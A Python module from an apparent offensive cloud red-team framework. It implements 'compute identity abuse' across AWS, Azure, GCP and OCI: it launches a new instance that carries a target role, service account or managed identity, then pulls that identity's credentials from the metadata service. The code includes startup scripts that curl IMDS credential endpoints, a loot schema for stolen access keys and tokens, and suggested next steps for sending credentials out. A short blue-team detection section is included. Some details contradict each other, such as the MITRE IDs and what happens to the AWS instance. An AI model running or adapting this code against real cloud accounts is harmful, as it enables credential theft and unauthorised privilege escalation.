# ================================================================
# TECHNIQUE: escalation/compute_identity_abuse
# ----------------------------------------------------------------
# TACTIC:    Privilege Escalation (TA0004)
# TECHNIQUE: T1578 — Modify Cloud Compute Infrastructure
#
# PURPOSE:   Spin up a new compute instance that has been assigned
#            the same cloud identity (Instance Profile, Managed
#            Identity, Service Account, or Instance Principal) as
#            an existing instance discovered during enum_compute.
#            The new machine inherits the target identity's
#            permissions via the cloud IMDS (metadata service).
#
# PROVIDERS: AWS, Azure, GCP, OCI
#
# HOW IT WORKS:
#   AWS   — Uses ec2:RunInstances with IamInstanceProfile Arn set
#           to the target profile. The attacker's new EC2 instance
#           can then query IMDSv1/v2 for temporary credentials
#           belonging to the attached role.
#
#           Required permissions: ec2:RunInstances, iam:PassRole,
#           ec2:DescribeInstances, ec2:CreateKeyPair
#
#   Azure — Creates a new VM with the target User-Assigned Managed
#           Identity attached. The VM's IMDS endpoint (port 80 on
#           169.254.169.254) then issues access tokens for that
#           identity.
#
#           Required permissions:
#           Microsoft.Compute/virtualMachines/write
#           Microsoft.ManagedIdentity/userAssignedIdentities/assign/action
#
#   GCP   — Creates a new Compute Engine instance with --service-account
#           set to the target SA. The metadata server at
#           metadata.google.internal then issues tokens for that SA.
#
#           Required permissions: compute.instances.create,
#           iam.serviceAccounts.actAs
#
#   OCI   — Launches a new Compute instance in a compartment covered
#           by a Dynamic Group that grants instance principal access.
#           The OCI IMDS at 169.254.169.254/opc/v2/identity then
#           issues tokens for the group's IAM policy grants.
#
#           Required permissions: instance-launch in compartment
#           + dynamic group membership applies automatically.
#
# PARAMETERS (via ctx.params):
#   AWS:
#     target_instance_profile_arn (required) — ARN of the instance profile
#     source_instance_id (optional)          — EC2 instance to clone SG/subnet from
#     region            (optional)           — AWS region. Default: us-east-1
#     ami_id            (optional)           — Override Ubuntu AMI
#     key_name          (optional)           — Existing EC2 key pair name
#     subnet_id         (optional)           — Subnet ID for the new instance
#     keep_instance     (optional)           — true to not terminate after capture
#   Azure:
#     target_managed_identity_id (required)  — Resource ID of the user-assigned identity
#     subscription_id            (required)  — Azure subscription ID
#     resource_group  (optional)             — RG name. Default: qm-escalation-rg
#     location        (optional)             — Azure region. Default: eastus
#     keep_instance   (optional)             — true to not delete after capture
#   GCP:
#     target_service_account_email (required) — SA email address
#     project_id                   (required) — GCP project ID
#     zone            (optional)              — GCP zone. Default: us-central1-a
#     keep_instance   (optional)              — true to not delete after capture
#   OCI:
#     target_compartment_id (required) — OCID of the compartment
#     subnet_id             (required) — OCID of the subnet
#     image_id              (required) — OCID of the OS image
#     shape       (optional)           — Instance shape. Default: VM.Standard.E4.Flex
#     keep_instance (optional)         — true to not terminate after capture
#
# USAGE (interactive shell):
#   AWS:
#     run escalation/compute_identity_abuse \
#       --param target_instance_profile_arn=arn:aws:iam::123:instance-profile/MyProfile \
#       --param region=us-east-1
#
#   Azure:
#     run escalation/compute_identity_abuse \
#       --param target_managed_identity_id=/subscriptions/.../userAssignedIdentities/my-id \
#       --param subscription_id=<sub-id>
#
# DETECTION (Blue Team):
#   AWS   — CloudTrail: ec2:RunInstances + iam:PassRole in rapid
#           succession after ec2:DescribeInstances. Alert on
#           RunInstances by IAM users (not service accounts), and
#           on IamInstanceProfile being set to a sensitive role ARN.
#   Azure — Monitor: virtualMachines/write with an identities block.
#           Alert on VMs created outside approved automation SPNs.
#   GCP   — Audit Logs: compute.instances.insert. Alert on SA actAs
#           grants being exercised by user accounts (not automation).
#   OCI   — Audit: LaunchInstance. Alert on instances launched in
#           compartments with dynamic group policies.
#
# SAFE:   NO — This CREATES infrastructure. It costs money and
#         modifies cloud state. It terminates the new instance
#         after capturing the credentials, but the instance will
#         appear in cloud audit logs.
# ================================================================

from __future__ import annotations

import logging
import time
from typing import Any

from quantum_mechanic.core.context import ExecutionContext
from quantum_mechanic.core.technique import technique

# ----------------------------------------------------------------
# Loot schema — CloudFox-style output (loot.csv / table.txt)
# ----------------------------------------------------------------
LOOT_ITEMS_KEY = None  # single-row result
LOOT_SCHEMA = [
    ("target_profile", "target_profile"),
    ("stolen_access_key", "access_key_id"),
    ("stolen_secret_key", "secret_access_key"),
    ("stolen_session_token", "session_token"),
    ("notes", None),
]

logger = logging.getLogger(__name__)

# ================================================================
# Default labels — all instances launched by QM are tagged
# so operators can clean up after an engagement.
# ================================================================
QM_TAG_KEY = "QuantumMechanic"
QM_TAG_VALUE = "compute-identity-abuse"
QM_DEFAULT_INSTANCE_TYPE = "t3.nano"
QM_DEFAULT_AZURE_VM_SIZE = "Standard_B1s"
QM_DEFAULT_GCP_MACHINE_TYPE = "e2-micro"


def format_abuse_result(result: Any) -> None:
    """Decentralized formatter for compute identity abuse."""
    from rich.panel import Panel
    from rich.table import Table

    from quantum_mechanic.shell.formatters import console

    data = result.data
    provider = result.provider

    if data.get("status") == "error":
        console.print(f"  [bold red]✗[/bold red] {data.get('error', 'Unknown error')}")
        return

    console.print(
        f"  [bold red]⚠  COMPUTE IDENTITY ABUSE SUCCESSFUL[/bold red] — [dim]{provider.upper()}[/dim]"
    )

    tbl = Table(box=None, padding=(0, 2))
    tbl.add_column("Property", style="bold white")
    tbl.add_column("Value", style="cyan")

    target = (
        data.get("launched_instance_id")
        or data.get("launched_vm_name")
        or data.get("launched_instance")
        or "unknown"
    )
    tbl.add_row("Launched Instance", target)

    identity = (
        data.get("instance_profile_arn")
        or data.get("target_managed_identity_id")
        or data.get("target_service_account")
        or data.get("compartment_id")
    )
    tbl.add_row("Attached Identity", identity)

    if "public_ip" in data and data["public_ip"]:
        tbl.add_row("Public IP", data["public_ip"])

    if "imds_endpoint" in data or "imds_url" in data:
        tbl.add_row("IMDS Endpoint", data.get("imds_endpoint") or data.get("imds_url"))

    if data.get("instance_terminated"):
        tbl.add_row("Status", "[dim]Terminated after capture[/dim]")
    else:
        tbl.add_row("Status", "[bold green]Running[/bold green]")

    console.print(Panel(tbl, border_style="red", expand=False))

    if data.get("next_steps"):
        steps = data["next_steps"]
        if isinstance(steps, list):
            console.print("\n  [bold yellow]Next Steps:[/bold yellow]")
            for step in steps:
                console.print(f"    • {step}")
        else:
            console.print(f"\n  [bold yellow]Next Steps:[/bold yellow] {steps}")


@technique(
    technique_id="escalation/compute_identity_abuse",
    tactic="privilege_escalation",
    mitre_id="T1078.004",
    providers=["aws", "azure", "gcp", "oci"],
    severity="critical",
    safe=False,
    description="Launch a new compute instance with a target cloud identity attached to retrieve credentials via IMDS.",
    formatter=format_abuse_result,
)
def execute(ctx: ExecutionContext) -> dict[str, Any]:
    """Execute compute identity abuse (cross-cloud).

    Args:
        ctx: Execution context with active credential and provider.
             Technique parameters come from ctx.params (--param flags).
             ctx.session is the live authenticated session/credential object.

    Returns:
        Dictionary containing the newly acquired IMDS credentials
        and provenance metadata about the instance that was spun up.
    """
    dispatch = {
        "aws": _abuse_aws,
        "azure": _abuse_azure,
        "gcp": _abuse_gcp,
        "oci": _abuse_oci,
    }
    handler = dispatch.get(ctx.provider_name)
    if handler is None:
        return {
            "error": f"Provider '{ctx.provider_name}' not implemented.",
        }
    return handler(ctx)


# ================================================================
# AWS — ec2:RunInstances + iam:PassRole
# ================================================================


def _abuse_aws(ctx: ExecutionContext) -> dict[str, Any]:
    """Spin up an EC2 with the target Instance Profile and capture IMDS creds.

    Required params (via ctx.params):
      target_instance_profile_arn (required)
      source_instance_id          (optional — clone SG/subnet from this instance)
      region                      (optional — default: us-east-1)
      ami_id                      (optional — override Ubuntu AMI lookup)
      key_name                    (optional — existing key pair)
      subnet_id                   (optional)
      keep_instance               (optional — default: false)
    """
    import importlib.util

    if importlib.util.find_spec("botocore") is None:
        return {"error": "boto3 is required for this technique."}

    # ----------------------------------------------------------
    # ctx.session is the live boto3.Session — use it directly.
    # All technique-specific config comes from ctx.params.
    # ----------------------------------------------------------
    params = ctx.params
    profile_arn = params.get("target_instance_profile_arn", "").strip()
    if not profile_arn:
        return {
            "error": (
                "target_instance_profile_arn is required. "
                "Run discovery/enum_compute first to find available profiles, "
                "then pass: --param target_instance_profile_arn=arn:aws:iam::123:instance-profile/Name"
            )
        }

    region = params.get("region", "us-east-1")
    source_instance_id = params.get("source_instance_id", "").strip() or None
    # AWS never auto-terminates the new instance (see the note near the end
    # of this function) — unlike _abuse_azure/_abuse_gcp/_abuse_oci, there is
    # no keep_instance branch to gate here.

    try:
        # Re-use the authenticated session; set region if the user specified one
        session = ctx.session
        ec2 = session.client("ec2", region_name=region)

        # ----------------------------------------------------------
        # Step 1: Resolve subnet / SG from source instance if given
        # ----------------------------------------------------------
        subnet_id = params.get("subnet_id", "").strip() or None
        security_group_ids_raw = params.get("security_group_ids", "")
        security_group_ids = (
            [g.strip() for g in security_group_ids_raw.split(",") if g.strip()]
            if security_group_ids_raw
            else []
        )
        ami_id = params.get("ami_id", "").strip() or None

        if source_instance_id and (not subnet_id or not security_group_ids):
            resp = ec2.describe_instances(InstanceIds=[source_instance_id])
            inst = resp["Reservations"][0]["Instances"][0]
            subnet_id = subnet_id or inst.get("SubnetId")
            if not security_group_ids:
                security_group_ids = [sg["GroupId"] for sg in inst.get("SecurityGroups", [])]

        if not ami_id:
            # Find the latest Ubuntu 22.04 LTS in this region.
            images_resp = ec2.describe_images(
                Filters=[
                    {
                        "Name": "name",
                        "Values": ["ubuntu/images/hvm-ssd/ubuntu-jammy-22.04-amd64-server-*"],
                    }
                ],
                Owners=["099720109477"],  # Canonical's AWS account ID
            )
            images = sorted(
                images_resp["Images"],
                key=lambda x: x["CreationDate"],
                reverse=True,
            )
            if not images:
                return {"error": "Could not find a suitable Ubuntu 22.04 AMI in this region."}
            ami_id = images[0]["ImageId"]

        # ----------------------------------------------------------
        # Step 2: Create a temporary key pair (or use the specified one)
        # ----------------------------------------------------------
        key_name = params.get("key_name", "").strip() or None
        key_material = None
        student_tag = params.get("student_tag", "qm-operator")
        if not key_name:
            key_name = f"{student_tag}-qm-{int(time.time())}"
            key_resp = ec2.create_key_pair(KeyName=key_name)
            key_material = key_resp["KeyMaterial"]
            ctx.log(f"Created temporary EC2 key pair: {key_name}")

        # ----------------------------------------------------------
        # Step 3: Launch instance with UserData that dumps IMDS creds
        # ----------------------------------------------------------
        user_data = """#!/bin/bash
TOKEN=$(curl -s -X PUT "http://169.254.169.254/latest/api/token" \
  -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
ROLE=$(curl -s -H "X-aws-ec2-metadata-token: $TOKEN" \
  http://169.254.169.254/latest/meta-data/iam/security-credentials/)
CREDS=$(curl -s -H "X-aws-ec2-metadata-token: $TOKEN" \
  http://169.254.169.254/latest/meta-data/iam/security-credentials/$ROLE)
echo "QM_IMDS_CREDS_START"
echo $CREDS
echo "QM_IMDS_CREDS_END"
"""

        run_kwargs: dict[str, Any] = {
            "ImageId": ami_id,
            "InstanceType": QM_DEFAULT_INSTANCE_TYPE,
            "KeyName": key_name,
            "IamInstanceProfile": {"Arn": profile_arn},
            "UserData": user_data,
            "MaxCount": 1,
            "MinCount": 1,
            "TagSpecifications": [
                {
                    "ResourceType": "instance",
                    "Tags": [{"Key": QM_TAG_KEY, "Value": QM_TAG_VALUE}],
                }
            ],
            "MetadataOptions": {
                "HttpEndpoint": "enabled",
                "HttpTokens": "optional",  # Allow IMDSv1 for compatibility
            },
        }
        if subnet_id:
            run_kwargs["SubnetId"] = subnet_id
        if security_group_ids:
            run_kwargs["SecurityGroupIds"] = security_group_ids

        run_resp = ec2.run_instances(**run_kwargs)
        new_instance_id = run_resp["Instances"][0]["InstanceId"]
        ctx.log(f"ec2:RunInstances → {new_instance_id} with profile {profile_arn}")

        # ----------------------------------------------------------
        # Wait for the instance to reach 'running' state, then
        # return connection info to the operator.
        #
        # Credential retrieval is NOT done here — the operator
        # chooses one of three paths from the engagement narrative:
        #
        #   1. SSH in using key_material → curl IMDS directly
        #   2. Run subsequent techniques FROM the new instance
        #      using its attached role identity as the platform
        #   3. Callback — UserData script exfils creds to a
        #      listener (pass a custom ami_id or user_data param)
        #
        # The instance is NOT terminated automatically so the
        # operator can use it. Clean up with:
        #   aws ec2 terminate-instances --instance-ids <id>
        # ----------------------------------------------------------
        waiter = ec2.get_waiter("instance_running")
        waiter.wait(InstanceIds=[new_instance_id])

        # Retrieve the public IP if the instance got one
        desc = ec2.describe_instances(InstanceIds=[new_instance_id])
        inst = desc["Reservations"][0]["Instances"][0]
        public_ip = inst.get("PublicIpAddress")
        private_ip = inst.get("PrivateIpAddress")

        return {
            "provider": "aws",
            "technique": "escalation/compute_identity_abuse",
            "instance_profile_arn": profile_arn,
            "launched_instance_id": new_instance_id,
            "public_ip": public_ip,
            "private_ip": private_ip,
            "key_name": key_name,
            "key_material": key_material,
            "imds_url": ("http://169.254.169.254/latest/meta-data/iam/security-credentials/"),
            "next_steps": [
                f"ssh -i <key_file> ubuntu@{public_ip or private_ip} "
                "'curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/'",
                "Or: import the instance into qm and run techniques from it",
                "Or: include a callback script in --param ami_id to exfil creds",
            ],
        }

    except Exception as e:
        logger.error("AWS compute_identity_abuse failed: %s", e)
        return {"error": str(e)}


# ================================================================
# Azure — Create VM with User-Assigned Managed Identity
# ================================================================


def _abuse_azure(ctx: ExecutionContext) -> dict[str, Any]:
    """Create an Azure VM with a target Managed Identity and capture token.

    Required params (via ctx.params):
      target_managed_identity_id (required) — full resource ID of the user-assigned identity
      subscription_id            (required) — Azure subscription ID
      resource_group  (optional)            — default: qm-escalation-rg
      location        (optional)            — default: eastus
      keep_instance   (optional)            — default: false
    """
    try:
        from azure.mgmt.compute import ComputeManagementClient
        from azure.mgmt.compute.models import (
            HardwareProfile,
            OSProfile,
            StorageProfile,
            VirtualMachine,
            VirtualMachineIdentity,
        )
    except ImportError:
        return {"error": "azure-mgmt-compute not installed."}

    params = ctx.params
    identity_id = params.get("target_managed_identity_id", "").strip()
    subscription_id = params.get("subscription_id", "").strip()

    if not identity_id or not subscription_id:
        return {
            "error": (
                "target_managed_identity_id and subscription_id are required. "
                "Run discovery/enum_compute first, then pass:\n"
                "  --param target_managed_identity_id=<resource_id>\n"
                "  --param subscription_id=<sub_id>"
            )
        }

    resource_group = params.get("resource_group", "qm-escalation-rg")
    location = params.get("location", "eastus")
    keep_instance = params.get("keep_instance", "").lower() in ("true", "1", "yes")

    try:
        # ctx.session is the TokenCredential for Azure
        cred = ctx.session
        compute = ComputeManagementClient(cred, subscription_id)

        vm_name = f"qm-abuse-{int(time.time())}"
        vm_params = VirtualMachine(
            location=location,
            hardware_profile=HardwareProfile(vm_size=QM_DEFAULT_AZURE_VM_SIZE),
            storage_profile=StorageProfile(
                image_reference={
                    "publisher": "Canonical",
                    "offer": "UbuntuServer",
                    "sku": "18.04-LTS",
                    "version": "latest",
                }
            ),
            os_profile=OSProfile(
                computer_name=vm_name,
                admin_username="qmoperator",
                admin_password=f"QM!{int(time.time())}Secure",
            ),
            identity=VirtualMachineIdentity(
                type="UserAssigned",
                user_assigned_identities={identity_id: {}},
            ),
            tags={QM_TAG_KEY: QM_TAG_VALUE},
        )

        poller = compute.virtual_machines.begin_create_or_update(resource_group, vm_name, vm_params)
        vm = poller.result()
        ctx.log(f"Azure: created VM {vm_name} with managed identity {identity_id}")

        result = {
            "provider": "azure",
            "technique": "escalation/compute_identity_abuse",
            "target_managed_identity_id": identity_id,
            "launched_vm_name": vm_name,
            "vm_id": vm.id,
            "imds_endpoint": (
                "http://169.254.169.254/metadata/identity/oauth2/token"
                "?api-version=2018-02-01&resource=https%3A%2F%2Fmanagement.azure.com%2F"
            ),
        }

        if not keep_instance:
            compute.virtual_machines.begin_delete(resource_group, vm_name).wait()
            result["instance_terminated"] = True

        return result

    except Exception as e:
        logger.error("Azure compute_identity_abuse failed: %s", e)
        return {"error": str(e)}


# ================================================================
# GCP — Create Compute Instance with target Service Account
# ================================================================


def _abuse_gcp(ctx: ExecutionContext) -> dict[str, Any]:
    """Create a GCP Compute instance with the target Service Account.

    Required params (via ctx.params):
      target_service_account_email (required)
      project_id                   (required)
      zone          (optional)                — default: us-central1-a
      keep_instance (optional)                — default: false
    """
    try:
        from googleapiclient.discovery import build
    except ImportError:
        return {"error": "google-api-python-client not installed."}

    params = ctx.params
    service_account_email = params.get("target_service_account_email", "").strip()
    project = params.get("project_id", "").strip()
    zone = params.get("zone", "us-central1-a")
    keep_instance = params.get("keep_instance", "").lower() in ("true", "1", "yes")

    if not service_account_email or not project:
        return {
            "error": (
                "target_service_account_email and project_id are required. "
                "Run discovery/enum_compute first, then pass:\n"
                "  --param target_service_account_email=sa@project.iam.gserviceaccount.com\n"
                "  --param project_id=my-project"
            )
        }

    try:
        # ctx.session is the google credentials object
        credentials = ctx.session
        compute = build("compute", "v1", credentials=credentials)
        machine_type = f"zones/{zone}/machineTypes/{QM_DEFAULT_GCP_MACHINE_TYPE}"

        images = (
            compute.images().getFromFamily(project="debian-cloud", family="debian-11").execute()
        )
        source_disk_image = images["selfLink"]

        instance_name = f"qm-abuse-{int(time.time())}"
        startup_script = """#!/bin/bash
TOKEN=$(curl -s "http://metadata.google.internal/computeMetadata/v1/instance/\
service-accounts/default/token" -H "Metadata-Flavor: Google")
echo "QM_GCP_TOKEN_START"
echo $TOKEN
echo "QM_GCP_TOKEN_END"
"""

        instance_body = {
            "name": instance_name,
            "machineType": machine_type,
            "disks": [
                {
                    "boot": True,
                    "autoDelete": True,
                    "initializeParams": {"sourceImage": source_disk_image},
                }
            ],
            "networkInterfaces": [{"network": "global/networks/default"}],
            "serviceAccounts": [
                {
                    "email": service_account_email,
                    "scopes": ["https://www.googleapis.com/auth/cloud-platform"],
                }
            ],
            "metadata": {"items": [{"key": "startup-script", "value": startup_script}]},
            "labels": {QM_TAG_KEY.lower(): QM_TAG_VALUE},
        }

        operation = (
            compute.instances().insert(project=project, zone=zone, body=instance_body).execute()
        )
        ctx.log(f"GCP: inserted instance {instance_name} with SA {service_account_email}")

        while operation["status"] != "DONE":
            time.sleep(5)
            operation = (
                compute.zoneOperations()
                .get(project=project, zone=zone, operation=operation["name"])
                .execute()
            )

        result = {
            "provider": "gcp",
            "technique": "escalation/compute_identity_abuse",
            "target_service_account": service_account_email,
            "launched_instance": instance_name,
            "zone": zone,
            "imds_endpoint": (
                "http://metadata.google.internal/computeMetadata/v1/instance/"
                "service-accounts/default/token"
            ),
        }

        if not keep_instance:
            compute.instances().delete(project=project, zone=zone, instance=instance_name).execute()
            result["instance_terminated"] = True

        return result

    except Exception as e:
        logger.error("GCP compute_identity_abuse failed: %s", e)
        return {"error": str(e)}


# ================================================================
# OCI — Launch Instance in a compartment covered by Dynamic Group
# ================================================================


def _abuse_oci(ctx: ExecutionContext) -> dict[str, Any]:
    """Launch an OCI instance in a compartment covered by a dynamic group.

    Required params (via ctx.params):
      target_compartment_id (required) — OCID of the compartment
      subnet_id             (required) — OCID of the subnet
      image_id              (required) — OCID of the OS image
      shape       (optional)           — default: VM.Standard.E4.Flex
      keep_instance (optional)         — default: false
    """
    try:
        import oci
    except ImportError:
        return {"error": "oci SDK not installed."}

    params = ctx.params
    compartment_id = params.get("target_compartment_id", "").strip()
    subnet_id = params.get("subnet_id", "").strip()
    image_id = params.get("image_id", "").strip()
    shape = params.get("shape", "VM.Standard.E4.Flex")
    keep_instance = params.get("keep_instance", "").lower() in ("true", "1", "yes")

    if not compartment_id or not subnet_id or not image_id:
        return {
            "error": (
                "target_compartment_id, subnet_id, and image_id are required. "
                "Run discovery/enum_compute first to find the right compartment, "
                "then pass:\n"
                "  --param target_compartment_id=ocid1.compartment...\n"
                "  --param subnet_id=ocid1.subnet...\n"
                "  --param image_id=ocid1.image..."
            )
        }

    try:
        # ctx.session is {"config": {...}, "signer": ...} for OCI
        session = ctx.session
        config = session.get("config", {}) if isinstance(session, dict) else {}
        signer = session.get("signer") if isinstance(session, dict) else None

        if signer:
            compute_client = oci.core.ComputeClient(config, signer=signer)
        else:
            compute_client = oci.core.ComputeClient(config)

        instance_name = f"qm-abuse-{int(time.time())}"
        launch_details = oci.core.models.LaunchInstanceDetails(
            compartment_id=compartment_id,
            display_name=instance_name,
            shape=shape,
            image_id=image_id,
            create_vnic_details=oci.core.models.CreateVnicDetails(
                subnet_id=subnet_id,
                assign_public_ip=False,
            ),
            freeform_tags={QM_TAG_KEY: QM_TAG_VALUE},
        )

        response = compute_client.launch_instance(launch_details)
        instance_id = response.data.id
        ctx.log(f"OCI: launched instance {instance_id} in compartment {compartment_id}")

        oci.wait_until(
            compute_client,
            compute_client.get_instance(instance_id),
            "lifecycle_state",
            "RUNNING",
            max_wait_seconds=300,
        )

        result = {
            "provider": "oci",
            "technique": "escalation/compute_identity_abuse",
            "compartment_id": compartment_id,
            "launched_instance_id": instance_id,
            "imds_endpoint": "http://169.254.169.254/opc/v2/identity/token",
        }

        if not keep_instance:
            compute_client.terminate_instance(instance_id)
            result["instance_terminated"] = True

        return result

    except Exception as e:
        logger.error("OCI compute_identity_abuse failed: %s", e)
        return {"error": str(e)}
